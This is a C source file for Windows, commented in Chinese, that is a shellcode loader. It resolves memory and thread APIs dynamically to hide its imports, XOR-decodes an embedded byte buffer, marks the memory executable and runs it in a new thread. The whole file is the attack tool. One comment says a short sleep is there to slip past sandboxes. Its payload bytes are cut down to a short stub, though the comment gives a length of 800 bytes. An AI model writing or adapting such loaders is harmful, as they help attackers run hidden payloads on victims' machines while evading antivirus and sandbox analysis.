#include <Windows.h>
#include <intrin.h>
#include <WinBase.h>
#include <stdio.h>

typedef LPVOID(WINAPI* ImportVirtualAlloc)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);

typedef HANDLE(WINAPI* ImportCreateThread)(
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId);

typedef BOOL(WINAPI* ImportVirtualProtect)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flNewProtect,
	PDWORD lpflOldProtect
	);

typedef DWORD(WINAPI* ImportWaitForSingleObject)(
	HANDLE hHandle,
	DWORD  dwMilliseconds
	);



// 入口函数
int wmain(int argc, TCHAR* argv[]) {

	ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "VirtualAlloc");
	ImportCreateThread MyCreateThread = (ImportCreateThread)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CreateThread");
	ImportVirtualProtect MyVirtualProtect = (ImportVirtualProtect)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "VirtualProtect");
	ImportWaitForSingleObject MyWaitForSingleObject = (ImportWaitForSingleObject)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "WaitForSingleObject");


	int shellcode_size = 0; // shellcode长度
	DWORD dwThreadId; // 线程ID
	HANDLE hThread; // 线程句柄
	DWORD dwOldProtect; // 内存页属性
/* length: 800 bytes */

	char buf[] = "\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81";


	// 获取shellcode大小
	shellcode_size = sizeof(buf);

	/* 增加异或代码 */
	for (int i = 0; i < shellcode_size; i++) {
		//Sleep(50);
		_InterlockedXor8(buf + i, 10);
	}
	
	/*
	VirtualAlloc(
		NULL, // 基址
		800,  // 大小
		MEM_COMMIT, // 内存页状态
		PAGE_EXECUTE_READWRITE // 可读可写可执行
		);
	*/

	char* shellcode = (char*)MyVirtualAlloc(
		NULL,
		shellcode_size,
		MEM_COMMIT,
		PAGE_READWRITE // 只申请可读可写
	);

	// 将shellcode复制到可读可写的内存页中
	CopyMemory(shellcode, buf, shellcode_size);

	// 这里开始更改它的属性为可执行
	MyVirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &dwOldProtect);

	// 等待几秒，兴许可以跳过某些沙盒呢？
	Sleep(2000);

	hThread = MyCreateThread(
		NULL, // 安全描述符
		NULL, // 栈的大小
		(LPTHREAD_START_ROUTINE)shellcode, // 函数
		NULL, // 参数
		NULL, // 线程标志
		&dwThreadId // 线程ID
	);

	MyWaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束
	return 0;
}
